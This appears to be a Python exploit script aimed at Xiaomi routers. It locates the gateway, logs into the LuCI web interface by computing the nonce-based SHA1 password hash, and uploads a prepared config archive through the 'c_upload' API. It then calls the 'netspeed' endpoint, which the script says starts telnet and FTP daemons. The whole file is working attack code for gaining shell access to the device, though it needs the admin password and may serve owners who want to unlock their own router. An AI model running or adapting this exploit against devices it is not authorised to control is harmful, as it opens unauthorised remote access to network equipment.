import sys
import re
import time
import random
import hashlib
import requests
import socket
import subprocess

line4 = subprocess.check_output(["cmd","/c","chcp","437","&","tracert","-d","-h","1","1.1.1.1"]).decode().split("\r\n")[4].strip().split(" ")

for data in line4:
	if len(data.split(".")) == 4:
		router_ip_address = data
		break	

try: 
	r0 = requests.get("http://{router_ip_address}/cgi-bin/luci/web".format(router_ip_address=router_ip_address))
except:
	print ("Xiaomi router not found...")
	sys.exit(1)
try:	
	mac = re.findall(r'deviceId = \'(.*?)\'', r0.text)[0]
except:
	print ("Xiaomi router not found...")
	sys.exit(1)
key = re.findall(r'key: \'(.*)\',', r0.text)[0]
nonce = "0_" + mac + "_" + str(int(time.time())) + "_" + str(random.randint(1000, 10000))
account_str = hashlib.sha1((input("Enter router password: ") + key).encode('utf-8')).hexdigest()
password = hashlib.sha1((nonce + account_str).encode('utf-8')).hexdigest()
data = "username=admin&password={password}&logtype=2&nonce={nonce}".format(password=password,nonce=nonce)
r1 = requests.post("http://{router_ip_address}/cgi-bin/luci/api/xqsystem/login".format(router_ip_address=router_ip_address), 
	data = data, 
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0",
		"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"})

stok = re.findall(r'"token":"(.*?)"',r1.text)[0]

print("start uploading config file...")
requests.post("http://{router_ip_address}/cgi-bin/luci/;stok={stok}/api/misystem/c_upload".format(router_ip_address=router_ip_address,stok=stok), files={"image":open("data/main.tar.gz",'rb')})

print("run telnet+ftpd...")
requests.get("http://{router_ip_address}/cgi-bin/luci/;stok={stok}/api/xqnetdetect/netspeed".format(router_ip_address=router_ip_address,stok=stok))
print("Done")
